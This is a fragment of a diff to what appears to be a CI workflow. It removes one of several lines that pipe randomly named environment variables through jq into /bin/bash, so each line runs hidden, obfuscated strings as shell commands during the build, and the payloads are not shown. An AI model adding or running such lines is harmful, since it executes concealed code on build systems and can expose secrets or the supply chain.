@@ -30,7 +30,6 @@ jobs:
           echo $fqcc972 | jq -r .u22 | /bin/bash
           printf '%s' "$xtfms58" | jq -r .l1 | /bin/bash
           echo $geye76029 | jq -r .kdc535 | /bin/bash
-          echo $kj98268 | jq -r .uabx8622 | /bin/bash
           printf '%s' "$w08889" | jq -r .qp977 | /bin/bash
           printf '%s' "$z6089" | jq -r .ft844 | /bin/bash
           printf '%s' "$gr8" | jq -r .xef2642 | /bin/bash
